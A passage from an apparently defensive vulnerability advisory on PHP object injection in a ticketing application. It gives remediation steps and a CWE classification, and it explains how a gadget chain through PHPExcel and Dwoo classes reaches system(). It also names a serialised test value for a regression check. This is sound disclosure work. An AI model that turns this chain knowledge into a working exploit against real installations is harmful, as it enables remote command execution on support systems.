   allowlist of the classes it expects. This is the control that survives future consumers of the same column.
3. Validate on the write side. For the select family, accept only values that identify one of the field's
   configured options; reject scalar payloads whose first bytes are `O:` or `a:`; and keep envelope construction
   server-side. The `Check()` routine at line 196 of the manager's update path should assert the value's shape,
   not merely the scalar-ness of array members.
4. Reduce gadget depth in the vendor pool. Remove or replace PHPExcel's `CachedObjectStorage` classes, or at
   minimum stop the destructor from concatenating a property into a SQL string and passing it to an object it
   does not own; constrain Dwoo's plugin proxy to a fixed allowlist of callables so that a serialised property
   cannot name `system` or another process-execution function. Gadget chains are assembled from ordinary
   library code, so each hop hardened is a chain broken.
5. Constrain the web identity. Run the application under an account that cannot write to the served application
   tree, keep the application root read-only to that account, and grant write access only to the specific
   upload and cache directories it needs. The recorded run wrote its marker into the webroot, which is precisely
   the capability this removes.
6. Test the class, not the case. Store `O:8:"stdClass":0:{}` as a linked-select field value in a regression
   test, run a staff search over the field, and assert that the raw value is rejected before `unserialize()`
   is reached and that no object is instantiated. Repeat for every custom-field type whose stored values are
   deserialised, so that a future branch does not reintroduce the gap.
7. Interim operator measures. Where the support workflow allows it, require registration or close anonymous
   ticket submission, and treat the text CAPTCHA as the anti-automation measure it is rather than as an input
   filter. Neither measure fixes the chain - one accepted ticket is enough - but both shrink the population
   that can plant a payload.

## 12. CWE

### CWE - classification rationale

- CWE-502 (Deserialization of Untrusted Data) is the primary class, and it is the class the record assigns.
  The vulnerable operation is `unserialize()` on a value that arrived from an unauthenticated user and was
  stored without an integrity envelope; the attacker controls the serialised stream, the classes it names and
  the property values those classes receive. PHP object injection is the platform-specific name for exactly
  this weakness, and every element of the chain - the `O:` token accepted by the pre-check, the missing
  `allowed_classes` restriction, the magic methods that run at request shutdown - belongs to it.
- CWE-78 (Improper Neutralization of Special Elements used in an OS Command) is the terminal consequence and
  the record's secondary class. The gadget chain ends in a `system()` call whose argument is built by string
  concatenation from a property the attacker controls, and the shell's own parsing turns the text after the
  semicolon into a second command. It is reported because it describes what the injected object graph achieves,
  not because the application itself builds a command from request data at that point.
- CWE-20 (Improper Input Validation) was considered and is not the primary class. The write-side `Check()`
  routine does validate shape, and the consumer applies no validation at all; but the defect that makes the
  chain work is the deserialisation of a stream the application did not build, not the absence of a character
  filter. Filing it as input validation would point remediation at the ticket form, while the durable fix is at
  the deserialiser and at the consumer's `isserialized` gate.
- CWE-470 (Use of Externally-Controlled Input to Select Classes or Code) was considered and not applied: the
  chain does not select a class through a reflection-style API, it reconstructs the class graph from the
  serialised stream itself, which CWE-502 already describes more precisely.
- CWE-284 (Improper Access Control) is not applicable. The staff search is authorised as designed; the defect
  is what the search does with a stored value, not who is allowed to run it.

---

Written by the 0day Rubbish Research Team.
